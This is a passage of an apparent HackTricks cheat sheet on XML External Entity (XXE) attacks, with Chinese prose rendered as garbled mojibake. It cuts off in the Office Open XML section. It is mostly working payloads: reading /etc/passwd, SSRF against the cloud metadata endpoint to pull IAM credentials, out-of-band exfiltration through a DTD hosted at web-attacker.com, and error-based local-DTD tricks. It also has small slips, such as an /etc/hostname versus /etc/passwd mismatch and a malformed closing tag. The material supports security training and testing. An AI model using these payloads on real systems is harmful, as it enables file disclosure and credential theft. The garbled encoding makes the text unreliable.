# XXE - XEE - XMLå¤–éƒ¨å®ä½“

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

- å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
- è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
- æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
- **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
- é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

XMLå¤–éƒ¨å®ä½“æ”»å‡»æ˜¯é’ˆå¯¹è§£æXMLè¾“å…¥çš„åº”ç”¨ç¨‹åºçš„ä¸€ç§æ”»å‡»ç±»å‹ã€‚

## XMLåŸºç¡€çŸ¥è¯†

**å¤§éƒ¨åˆ†å†…å®¹åŸºäºè¿™ä¸ªå‡ºè‰²çš„Portswiggeré¡µé¢ï¼š** [**https://portswigger.net/web-security/xxe/xml-entities**](https://portswigger.net/web-security/xxe/xml-entities)

### å¯æ‰©å±•æ ‡è®°è¯­è¨€æ¦‚è¿° <a href="#overview-of-extensible-markup-language" id="overview-of-extensible-markup-language"></a>

å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼Œé€šå¸¸ç®€ç§°ä¸ºXMLï¼Œè¢«å®šä¹‰ä¸ºä¸€ç§ç”¨äºå­˜å‚¨å’Œä¼ è¾“æ•°æ®çš„æ ‡è®°è¯­è¨€ã€‚XMLé‡‡ç”¨ç±»ä¼¼HTMLçš„æ ‘çŠ¶ç»“æ„ï¼Œç”±æ ‡è®°å’Œæ•°æ®ç»„æˆï¼Œä¸HTMLä¸åŒçš„æ˜¯ï¼ŒXMLä¸é™åˆ¶äºé¢„å®šä¹‰æ ‡è®°ã€‚è¿™ç§çµæ´»æ€§å…è®¸ä½¿ç”¨æ ¹æ®å…¶å°è£…æ•°æ®çš„æè¿°æ€§å‘½åçš„æ ‡è®°ã€‚åœ¨å†å²ä¸Šï¼ŒXMLä½œä¸ºæ•°æ®ä¼ è¾“æ ¼å¼è€Œå¤‡å—æ¨å´‡ï¼Œå°¤å…¶ä»¥å…¶å¯¹â€œAJAXâ€ï¼ˆå…¶ä¸­â€œXâ€ä»£è¡¨â€œXMLâ€ï¼‰çš„è´¡çŒ®è€Œé—»åã€‚ç„¶è€Œï¼Œéšç€JSONæˆä¸ºé¦–é€‰æ ¼å¼ï¼ŒXMLçš„æµè¡Œåº¦æœ‰æ‰€ä¸‹é™ã€‚

### é€šè¿‡å®ä½“åœ¨XMLä¸­è¡¨ç¤ºæ•°æ®é¡¹ <a href="#representation-of-data-items-in-xml-through-entities" id="representation-of-data-items-in-xml-through-entities"></a>

åœ¨XMLä¸­ï¼Œå®ä½“ç”¨ä½œè¡¨ç¤ºæ–‡æ¡£ä¸­æ•°æ®é¡¹çš„æœºåˆ¶ï¼Œæä¾›äº†ä¸€ç§æ›¿ä»£ç›´æ¥æ’å…¥æ•°æ®çš„æ–¹æ³•ã€‚XMLè§„èŒƒåŒ…å«å„ç§å†…ç½®å®ä½“ã€‚ä¾‹å¦‚ï¼Œ`&lt;`å’Œ`&gt;`ç”¨äºåˆ†åˆ«è¡¨ç¤º`<`å’Œ`>`å­—ç¬¦ã€‚ç”±äºå®ƒä»¬åœ¨æ ‡è®°XMLæ ‡ç­¾æ–¹é¢çš„ä½œç”¨ï¼Œè¿™äº›å…ƒå­—ç¬¦åœ¨æ•°æ®ä¸­å‡ºç°æ—¶é€šå¸¸å¿…é¡»ä½¿ç”¨å®ä½“æ¥è¡¨ç¤ºã€‚

### å®šä¹‰XMLå…ƒç´ 

åœ¨XMLä¸­ï¼Œå…ƒç´ ç±»å‹å£°æ˜è‡³å…³é‡è¦ï¼Œå› ä¸ºå®ƒä»¬ä¸ºXMLæ–‡æ¡£ä¸­å…ƒç´ çš„å­˜åœ¨ã€ç±»å‹å’Œé¡ºåºå»ºç«‹äº†å‡†åˆ™ã€‚ä¸¾ä¾‹è¯´æ˜åŒ…æ‹¬ï¼š

- `<!ELEMENT stockCheck ANY>` è¡¨ç¤º`<stockCheck></stockCheck>`å…ƒç´ å¯ä»¥åŒ…å«ä»»ä½•ç±»å‹çš„å¯¹è±¡ã€‚
- `<!ELEMENT stockCheck EMPTY>` æŒ‡ç¤º`<stockCheck></stockCheck>`å…ƒç´ åº”ä¿æŒæ— å†…å®¹ã€‚
- `<!ELEMENT stockCheck (productId,storeId)>` æŒ‡å®š`<stockCheck>`å…ƒç´ åªèƒ½åŒ…å«`<productId>`å’Œ`<storeId>`ä½œä¸ºå­å…ƒç´ ã€‚

### æ–‡æ¡£ç±»å‹å®šä¹‰ç®€ä»‹ <a href="#introduction-to-document-type-definition" id="introduction-to-document-type-definition"></a>

æ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆDTDï¼‰é€šè¿‡æä¾›å£°æ˜æ¥è§„å®šXMLæ–‡æ¡£çš„ç»“æ„ã€å…è®¸çš„æ•°æ®ç±»å‹ç­‰ï¼Œåœ¨XMLä¸­å‘æŒ¥ç€å…³é”®ä½œç”¨ã€‚`DOCTYPE`å…ƒç´ æ˜¯å¯é€‰çš„ï¼Œä½äºXMLæ–‡æ¡£å¼€å¤´ï¼Œå¯ä»¥å£°æ˜ä¸€ä¸ªDTDã€‚DTDå¯ä»¥åˆ†ä¸ºâ€œå†…éƒ¨â€ï¼ˆå®Œå…¨åµŒå…¥åœ¨æ–‡æ¡£ä¸­ï¼‰ã€â€œå¤–éƒ¨â€ï¼ˆä»å¤–éƒ¨æºåŠ è½½ï¼‰æˆ–ä¸¤è€…ç»“åˆçš„å½¢å¼ã€‚

### åœ¨XMLä¸­ä½¿ç”¨è‡ªå®šä¹‰å®ä½“ <a href="#utilization-of-custom-entities-in-xml" id="utilization-of-custom-entities-in-xml"></a>

XMLå…è®¸åœ¨DTDä¸­å®šä¹‰è‡ªå®šä¹‰å®ä½“ã€‚ä¸€ä¸ªç¤ºä¾‹å£°æ˜ï¼š

`<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>`

è¿™æ ·çš„å£°æ˜è¡¨æ˜æ–‡æ¡£ä¸­çš„å®ä½“å¼•ç”¨`&myentity;`å°†æ›¿æ¢ä¸ºâ€œmy entity valueâ€ã€‚

### åœ¨XMLä¸­å¼•å…¥å¤–éƒ¨å®ä½“ <a href="#incorporation-of-external-entities-in-xml" id="incorporation-of-external-entities-in-xml"></a>

XMLä¸­çš„å¤–éƒ¨å®ä½“æ˜¯è‡ªå®šä¹‰å®ä½“çš„ä¸€ä¸ªå­ç±»å‹ï¼Œå…¶å®šä¹‰ä½äºDTDä¹‹å¤–ã€‚è¿™äº›å®ä½“ä½¿ç”¨`SYSTEM`å…³é”®å­—ï¼Œå¹¶éœ€è¦æŒ‡å®šä¸€ä¸ªURLï¼Œè¯¥URLæŒ‡å®šå®ä½“å€¼çš„è·å–ä½ç½®ï¼Œä»è€Œå¯èƒ½å®ç°[XMLå¤–éƒ¨å®ä½“æ”»å‡»](https://portswigger.net/web-security/xxe)ã€‚

### åˆ©ç”¨XMLå‚æ•°å®ä½“è¿›è¡ŒXXEæ£€æµ‹

åœ¨æ ‡å‡†å®ä½“æ— æ³•åˆ©ç”¨XXEæ¼æ´è¿›è¡Œæ”»å‡»çš„æƒ…å†µä¸‹ï¼Œç”±äºéªŒè¯æˆ–XMLè§£æå™¨åŠ å›ºï¼Œå¯ä»¥ä½¿ç”¨XMLå‚æ•°å®ä½“ã€‚XMLå‚æ•°å®ä½“ä»¥ç™¾åˆ†å·å­—ç¬¦ä½œä¸ºå®ä½“åç§°ä¹‹å‰çš„æ ‡å¿—ï¼Œå¹¶ä½¿ç”¨ç›¸åŒå­—ç¬¦å¼•ç”¨ï¼Œä»…åœ¨DTDä¸­å¼•ç”¨ã€‚å®ƒä»¬å¯ä»¥é€šè¿‡å¸¦å¤–æ–¹æ³•ä¿ƒæˆç›²ç›®XXEæ£€æµ‹ï¼Œä¾‹å¦‚å‘èµ·DNSæŸ¥æ‰¾å’ŒHTTPè¯·æ±‚åˆ°æ”»å‡»è€…æ§åˆ¶çš„åŸŸï¼Œä»è€Œç¡®è®¤æ”»å‡»çš„æˆåŠŸã€‚


## ä¸»è¦æ”»å‡»

**[å¤§éƒ¨åˆ†è¿™äº›æ”»å‡»æ˜¯ä½¿ç”¨å‡ºè‰²çš„Portswiggers XEEå®éªŒå®¤è¿›è¡Œæµ‹è¯•çš„ï¼šhttps://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)**

### æ–°å®ä½“æµ‹è¯•

åœ¨è¿™æ¬¡æ”»å‡»ä¸­ï¼Œæˆ‘å°†æµ‹è¯•ä¸€ä¸ªç®€å•çš„æ–°å®ä½“å£°æ˜æ˜¯å¦æœ‰æ•ˆã€‚
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
### è¯»å–æ–‡ä»¶

è®©æˆ‘ä»¬å°è¯•ä»¥ä¸åŒçš„æ–¹å¼è¯»å– `/etc/passwd` æ–‡ä»¶ã€‚å¯¹äºWindowsï¼Œæ‚¨å¯ä»¥å°è¯•è¯»å–ï¼š`C:\windows\system32\drivers\etc\hosts`

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¯·æ³¨æ„SYSTEM "_\*\*file:///\*\*etc/passwd_" ä¹Ÿå¯ä»¥å·¥ä½œã€‚
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
è¿™ç¬¬äºŒç§æƒ…å†µåº”è¯¥å¯¹æå–æ–‡ä»¶å¾ˆæœ‰ç”¨ï¼Œå¦‚æœWebæœåŠ¡å™¨æ­£åœ¨ä½¿ç”¨PHPï¼ˆä¸æ˜¯Portswiggerså®éªŒçš„æƒ…å†µï¼‰ã€‚
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
åœ¨è¿™ç¬¬ä¸‰ä¸ªæ¡ˆä¾‹ä¸­ï¼Œè¯·æ³¨æ„æˆ‘ä»¬å°†`Element stockCheck`å£°æ˜ä¸ºANYã€‚
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
### ç›®å½•åˆ—è¡¨

åœ¨åŸºäº**Java**çš„åº”ç”¨ç¨‹åºä¸­ï¼Œå¯ä»¥é€šè¿‡ç±»ä¼¼ä»¥ä¸‹è´Ÿè½½çš„XXEæ¥**åˆ—å‡ºç›®å½•çš„å†…å®¹**ï¼ˆä»…è¯·æ±‚ç›®å½•è€Œéæ–‡ä»¶ï¼‰ï¼š
```markup
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

XXEå¯èƒ½è¢«ç”¨æ¥æ»¥ç”¨äº‘ä¸­çš„SSRF
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### ç›² SSRF

ä½¿ç”¨**å…ˆå‰è¯„è®ºçš„æŠ€æœ¯**ï¼Œæ‚¨å¯ä»¥è®©æœåŠ¡å™¨è®¿é—®æ‚¨æ§åˆ¶çš„æœåŠ¡å™¨ä»¥æ˜¾ç¤ºå…¶å­˜åœ¨æ¼æ´ã€‚ä½†æ˜¯ï¼Œå¦‚æœè¿™ç§æ–¹æ³•ä¸èµ·ä½œç”¨ï¼Œå¯èƒ½æ˜¯å› ä¸º**ä¸å…è®¸ä½¿ç”¨ XML å®ä½“**ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥å°è¯•ä½¿ç”¨**XML å‚æ•°å®ä½“**ï¼š
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "ç›²" SSRF - é€šè¿‡å¸¦å¤–æ•°æ®æ³„éœ²

**åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†è®©æœåŠ¡å™¨åŠ è½½ä¸€ä¸ªå¸¦æœ‰æ¶æ„æœ‰æ•ˆè´Ÿè½½çš„æ–°DTDï¼Œè¯¥æœ‰æ•ˆè´Ÿè½½å°†é€šè¿‡HTTPè¯·æ±‚å‘é€æ–‡ä»¶çš„å†…å®¹ï¼ˆå¯¹äºå¤šè¡Œæ–‡ä»¶ï¼Œæ‚¨å¯ä»¥å°è¯•é€šè¿‡** _**ftp://**_**è¿›è¡Œæ³„éœ²ï¼‰ã€‚æ­¤è¯´æ˜æ‘˜è‡ª** [**Portswiggerså®éªŒå®¤è¿™é‡Œ**](https://portswigger.net/web-security/xxe/blind)**ã€‚**

ä¸€ä¸ªç”¨äºæ³„éœ²`/etc/hostname`æ–‡ä»¶å†…å®¹çš„æ¶æ„DTDç¤ºä¾‹å¦‚ä¸‹ï¼š
```markup
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
è¿™ä¸ªDTDæ‰§è¡Œä»¥ä¸‹æ­¥éª¤ï¼š

* å®šä¹‰ä¸€ä¸ªåä¸º `file` çš„XMLå‚æ•°å®ä½“ï¼ŒåŒ…å« `/etc/passwd` æ–‡ä»¶çš„å†…å®¹ã€‚
* å®šä¹‰ä¸€ä¸ªåä¸º `eval` çš„XMLå‚æ•°å®ä½“ï¼ŒåŒ…å«å¯¹å¦ä¸€ä¸ªåä¸º `exfiltrate` çš„XMLå‚æ•°å®ä½“çš„åŠ¨æ€å£°æ˜ã€‚`exfiltrate` å®ä½“å°†é€šè¿‡å‘æ”»å‡»è€…çš„WebæœåŠ¡å™¨å‘èµ·HTTPè¯·æ±‚æ¥è¯„ä¼° `file` å®ä½“çš„å€¼ï¼Œè¯¥è¯·æ±‚å°†åœ¨URLæŸ¥è¯¢å­—ç¬¦ä¸²ä¸­åŒ…å«ã€‚
* ä½¿ç”¨ `eval` å®ä½“ï¼Œå¯¼è‡´å¯¹ `exfiltrate` å®ä½“çš„åŠ¨æ€å£°æ˜è¢«æ‰§è¡Œã€‚
* ä½¿ç”¨ `exfiltrate` å®ä½“ï¼Œä½¿å…¶å€¼é€šè¿‡è¯·æ±‚æŒ‡å®šçš„URLæ¥è¯„ä¼°ã€‚

æ”»å‡»è€…å¿…é¡»å°†æ¶æ„çš„DTDæ‰˜ç®¡åœ¨ä»–ä»¬æ§åˆ¶çš„ç³»ç»Ÿä¸Šï¼Œé€šå¸¸æ˜¯é€šè¿‡å°†å…¶åŠ è½½åˆ°è‡ªå·±çš„WebæœåŠ¡å™¨ä¸Šã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåœ¨ä»¥ä¸‹URLä¸Šæä¾›æ¶æ„çš„DTDï¼š\
`http://web-attacker.com/malicious.dtd`

æœ€åï¼Œæ”»å‡»è€…å¿…é¡»å‘æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºæäº¤ä»¥ä¸‹XXEæœ‰æ•ˆè½½è·ï¼š
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
è¿™ä¸ªXXEè´Ÿè½½å£°æ˜äº†ä¸€ä¸ªåä¸º`xxe`çš„XMLå‚æ•°å®ä½“ï¼Œç„¶ååœ¨DTDä¸­ä½¿ç”¨è¿™ä¸ªå®ä½“ã€‚è¿™å°†å¯¼è‡´XMLè§£æå™¨ä»æ”»å‡»è€…çš„æœåŠ¡å™¨è·å–å¤–éƒ¨DTDå¹¶å†…è”è§£é‡Šå®ƒã€‚æ¶æ„DTDä¸­å®šä¹‰çš„æ­¥éª¤å°†è¢«æ‰§è¡Œï¼Œ`/etc/passwd`æ–‡ä»¶å°†è¢«ä¼ è¾“åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚

### åŸºäºé”™è¯¯çš„(å¤–éƒ¨DTD)

**åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†è®©æœåŠ¡å™¨åŠ è½½ä¸€ä¸ªæ¶æ„çš„DTDï¼Œè¯¥DTDå°†åœ¨é”™è¯¯æ¶ˆæ¯ä¸­æ˜¾ç¤ºæ–‡ä»¶çš„å†…å®¹ï¼ˆä»…å½“æ‚¨å¯ä»¥çœ‹åˆ°é”™è¯¯æ¶ˆæ¯æ—¶æ‰æœ‰æ•ˆï¼‰ã€‚** [**ç¤ºä¾‹åœ¨è¿™é‡Œã€‚**](https://portswigger.net/web-security/xxe/blind)

æ‚¨å¯ä»¥ä½¿ç”¨æ¶æ„çš„å¤–éƒ¨DTDè§¦å‘åŒ…å«`/etc/passwd`æ–‡ä»¶å†…å®¹çš„XMLè§£æé”™è¯¯æ¶ˆæ¯ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š
```markup
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
è¿™ä¸ªDTDæ‰§è¡Œä»¥ä¸‹æ­¥éª¤ï¼š

* å®šä¹‰ä¸€ä¸ªåä¸º `file` çš„XMLå‚æ•°å®ä½“ï¼ŒåŒ…å« `/etc/passwd` æ–‡ä»¶çš„å†…å®¹ã€‚
* å®šä¹‰ä¸€ä¸ªåä¸º `eval` çš„XMLå‚æ•°å®ä½“ï¼ŒåŒ…å«å¦ä¸€ä¸ªåä¸º `error` çš„XMLå‚æ•°å®ä½“çš„åŠ¨æ€å£°æ˜ã€‚`error` å®ä½“å°†é€šè¿‡åŠ è½½ä¸€ä¸ªåŒ…å« `file` å®ä½“å€¼çš„ä¸å­˜åœ¨æ–‡ä»¶æ¥è¿›è¡Œè¯„ä¼°ã€‚
* ä½¿ç”¨ `eval` å®ä½“ï¼Œå¯¼è‡´æ‰§è¡Œ `error` å®ä½“çš„åŠ¨æ€å£°æ˜ã€‚
* ä½¿ç”¨ `error` å®ä½“ï¼Œä½¿å…¶å€¼é€šè¿‡å°è¯•åŠ è½½ä¸å­˜åœ¨çš„æ–‡ä»¶è¿›è¡Œè¯„ä¼°ï¼Œå¯¼è‡´åŒ…å«ä¸å­˜åœ¨æ–‡ä»¶åçš„é”™è¯¯æ¶ˆæ¯ï¼Œè¯¥æ–‡ä»¶åæ˜¯ `/etc/passwd` æ–‡ä»¶çš„å†…å®¹ã€‚

è°ƒç”¨å¤–éƒ¨DTDé”™è¯¯ï¼š
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### **åŸºäºé”™è¯¯çš„ (system DTD)**

é‚£ä¹ˆå½“**é˜»æ­¢å¸¦å¤–äº¤äº’**ï¼ˆå¤–éƒ¨è¿æ¥ä¸å¯ç”¨ï¼‰æ—¶ï¼Œç›²ç›® XXE æ¼æ´å¦‚ä½•å¤„ç†å‘¢ï¼Ÿ

XML è¯­è¨€è§„èŒƒä¸­çš„ä¸€ä¸ªæ¼æ´å¯ä»¥é€šè¿‡é”™è¯¯æ¶ˆæ¯**æš´éœ²æ•æ„Ÿæ•°æ®**ï¼Œå½“æ–‡æ¡£çš„ DTD æ··åˆäº†å†…éƒ¨å’Œå¤–éƒ¨å£°æ˜æ—¶ã€‚è¿™ä¸ªé—®é¢˜å…è®¸åœ¨å†…éƒ¨é‡æ–°å®šä¹‰åœ¨å¤–éƒ¨å£°æ˜çš„å®ä½“ï¼Œä¿ƒè¿›åŸºäºé”™è¯¯çš„ XXE æ”»å‡»çš„æ‰§è¡Œã€‚è¿™ç§æ”»å‡»åˆ©ç”¨äº†åœ¨å†…éƒ¨ DTD ä¸­é‡æ–°å®šä¹‰ XML å‚æ•°å®ä½“ï¼Œæœ€åˆåœ¨å¤–éƒ¨ DTD ä¸­å£°æ˜ã€‚å½“æœåŠ¡å™¨é˜»æ­¢å¸¦å¤–è¿æ¥æ—¶ï¼Œæ”»å‡»è€…å¿…é¡»ä¾èµ–æœ¬åœ° DTD æ–‡ä»¶æ¥è¿›è¡Œæ”»å‡»ï¼Œæ—¨åœ¨è¯±å‘è§£æé”™è¯¯ä»¥æ­ç¤ºæ•æ„Ÿä¿¡æ¯ã€‚

è€ƒè™‘ä¸€ä¸ªåœºæ™¯ï¼ŒæœåŠ¡å™¨çš„æ–‡ä»¶ç³»ç»ŸåŒ…å«ä¸€ä¸ªä½äº `/usr/local/app/schema.dtd` çš„ DTD æ–‡ä»¶ï¼Œå®šä¹‰äº†ä¸€ä¸ªåä¸º `custom_entity` çš„å®ä½“ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æäº¤ä»¥ä¸‹æ··åˆ DTD æ¥è¯±å‘ XML è§£æé”™è¯¯ï¼Œä»è€Œæ­ç¤º `/etc/passwd` æ–‡ä»¶çš„å†…å®¹ï¼š
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
ä»¥ä¸‹æ˜¯ç”±æ­¤DTDæ‰§è¡Œçš„æ­¥éª¤ï¼š

- å®šä¹‰äº†ä¸€ä¸ªåä¸º`local_dtd`çš„XMLå‚æ•°å®ä½“ï¼Œå…¶ä¸­åŒ…å«ä½äºæœåŠ¡å™¨æ–‡ä»¶ç³»ç»Ÿä¸Šçš„å¤–éƒ¨DTDæ–‡ä»¶ã€‚
- å¯¹`custom_entity` XMLå‚æ•°å®ä½“è¿›è¡Œé‡æ–°å®šä¹‰ï¼Œæœ€åˆåœ¨å¤–éƒ¨DTDä¸­å®šä¹‰ï¼Œä»¥å°è£…ä¸€ä¸ª[åŸºäºé”™è¯¯çš„XXEåˆ©ç”¨](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages)ã€‚è¿™ç§é‡æ–°å®šä¹‰æ—¨åœ¨å¼•å‘è§£æé”™è¯¯ï¼Œä»è€Œæš´éœ²`/etc/passwd`æ–‡ä»¶çš„å†…å®¹ã€‚
- é€šè¿‡ä½¿ç”¨`local_dtd`å®ä½“ï¼Œå¯ç”¨äº†å¤–éƒ¨DTDï¼ŒåŒ…å«äº†æ–°å®šä¹‰çš„`custom_entity`ã€‚è¿™ä¸€ç³»åˆ—æ“ä½œå¯¼è‡´äº†åˆ©ç”¨æ‰€é’ˆå¯¹çš„é”™è¯¯æ¶ˆæ¯çš„å‘å‡ºã€‚

**çœŸå®ä¸–ç•Œç¤ºä¾‹ï¼š** ä½¿ç”¨GNOMEæ¡Œé¢ç¯å¢ƒçš„ç³»ç»Ÿé€šå¸¸åœ¨`/usr/share/yelp/dtd/docbookx.dtd`ä¸­åŒ…å«ä¸€ä¸ªåä¸º`ISOamso`çš„å®ä½“ã€‚
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (224).png>)

ç”±äºè¿™ç§æŠ€æœ¯ä½¿ç”¨**å†…éƒ¨ DTDï¼Œæ‚¨é¦–å…ˆéœ€è¦æ‰¾åˆ°ä¸€ä¸ªæœ‰æ•ˆçš„ DTD**ã€‚æ‚¨å¯ä»¥é€šè¿‡**å®‰è£…**ä¸æœåŠ¡å™¨ç›¸åŒçš„**æ“ä½œç³»ç»Ÿ/è½¯ä»¶**ï¼Œå¹¶**æœç´¢ä¸€äº›é»˜è®¤çš„ DTD**ï¼Œæˆ–è€…**è·å–ç³»ç»Ÿä¸­é»˜è®¤ DTD çš„åˆ—è¡¨**ï¼Œç„¶å**æ£€æŸ¥**æ˜¯å¦å­˜åœ¨ä»»ä½•ä¸€ä¸ªï¼š
```markup
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
æ›´å¤šä¿¡æ¯è¯·æŸ¥çœ‹[https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### åœ¨ç³»ç»Ÿä¸­æŸ¥æ‰¾DTDs

åœ¨ä»¥ä¸‹ä»¤äººæ•¬ç•çš„githubå­˜å‚¨åº“ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°**å¯èƒ½å­˜åœ¨äºç³»ç»Ÿä¸­çš„DTDsçš„è·¯å¾„**ï¼š

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

æ­¤å¤–ï¼Œå¦‚æœæ‚¨æœ‰**å—å®³ç³»ç»Ÿçš„Dockeré•œåƒ**ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ç›¸åŒå­˜å‚¨åº“ä¸­çš„å·¥å…·æ¥**æ‰«æ**è¯¥**é•œåƒ**å¹¶**æŸ¥æ‰¾**ç³»ç»Ÿä¸­å­˜åœ¨çš„**DTDs**çš„è·¯å¾„ã€‚é˜…è¯»[githubçš„Readme](https://github.com/GoSecure/dtd-finder)ä»¥äº†è§£è¯¦æƒ…ã€‚
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### é€šè¿‡ Office Open XML è§£æå™¨è¿›è¡Œ XXE æ”»å‡»

è¦äº†è§£è¿™ç§æ”»å‡»çš„æ›´æ·±å…¥è§£é‡Šï¼Œè¯·æŸ¥çœ‹ Detectify çš„[è¿™ç¯‡ç²¾å½©æ–‡ç« ](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/)çš„ç¬¬äºŒéƒ¨åˆ†ã€‚

è®¸å¤š Web åº”ç”¨ç¨‹åºæä¾›äº†ä¸Šä¼  Microsoft Office æ–‡æ¡£çš„åŠŸèƒ½ï¼Œç„¶åä»è¿™äº›æ–‡æ¡£ä¸­æå–æŸäº›è¯¦ç»†ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼ŒWeb åº”ç”¨ç¨‹åºå¯èƒ½å…è®¸ç”¨æˆ·é€šè¿‡ä¸Šä¼  XLSX æ ¼å¼çš„ç”µå­è¡¨æ ¼æ¥å¯¼å…¥æ•°æ®ã€‚ä¸ºäº†ä»ç”µå­è¡¨æ ¼ä¸­æå–æ•°æ®ï¼Œè§£æå™¨å¿…ç„¶éœ€è¦è§£æè‡³å°‘ä¸€ä¸ª XML æ–‡ä»¶ã€‚

